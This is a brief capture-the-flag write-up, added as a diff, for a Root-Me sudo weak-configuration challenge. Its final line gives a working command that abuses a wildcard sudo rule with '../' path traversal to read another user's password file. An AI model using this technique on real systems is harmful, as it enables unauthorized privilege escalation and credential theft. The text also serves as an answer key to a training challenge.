@@ -1,0 +1,10 @@
+Task on RootMe: https://www.root-me.org/en/Challenges/App-Script/sudo-weak-configuration
+Video Solution: https://youtu.be/UEGzf_Ba4HQ
+
+To read the .passwd located in the following PATH:
+/challenge/app-script/ch1/ch1cracked/
+we need to know what command we may run as sudo.
+With 'sudo -l' command we can see this command.
+In this task we can run /bin/cat as user app-script-ch1-cracked in /challenge/app-script/ch1/ch1/*
+To run command as another user:
+sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
